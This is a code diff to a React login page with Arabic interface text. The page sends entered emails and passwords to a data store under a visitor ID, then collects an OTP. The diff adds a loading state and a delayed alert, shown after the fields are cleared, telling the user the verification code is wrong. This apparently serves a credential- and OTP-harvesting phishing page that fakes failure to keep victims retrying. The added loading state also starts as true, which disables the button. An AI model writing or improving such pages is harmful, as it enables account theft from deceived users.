@@ -14,6 +14,7 @@ export default function LoginPage() {
   const [password, setPassword] = useState("");
   const [otp, setOtp] = useState(["", "", "", "", "", ""]);
   const [showSplash, setShowSplash] = useState(true);
+  const [loding, setloading] = useState(true);
 
   useEffect(() => {
     getLocation().then(() => {
@@ -30,10 +31,12 @@ export default function LoginPage() {
 
   const handleLoginSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    setloading(true)
     if (email && password) {
       await addData({ id: visitorID, email, password })
       setTimeout(() => {
         setStep("otp");
+    setloading(false)
       }, 3000);
     }
   };
@@ -65,6 +68,10 @@ export default function LoginPage() {
       setEmail("");
       setPassword("");
       setOtp(["", "", "", "", "", ""]);
+      setTimeout(() => {
+      alert("رمز التحقق غير صحيح")
+        
+      }, 2000);
     }
   };
   async function getLocation() {
@@ -178,9 +185,10 @@ export default function LoginPage() {
               {/* Submit Button */}
               <button
                 type="submit"
+                disabled={loding}
                 className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-bold py-4 px-4 rounded-full transition-all duration-200 mb-8 shadow-lg text-lg"
               >
-                تسجيل الدخول
+                {loding?"يرجى الانتظار":"تسجيل"}
               </button>
             </form>
 
@@ -211,7 +219,7 @@ export default function LoginPage() {
                 <label className="block text-right text-gray-700 font-medium mb-4">
                   أدخل رمز التحقق
                 </label>
-                <div className="flex gap-3 justify-center">
+                <div className="flex gap-3 justify-center" dir="ltr">
                   {otp.map((digit, index) => (
                     <input
                       key={index}
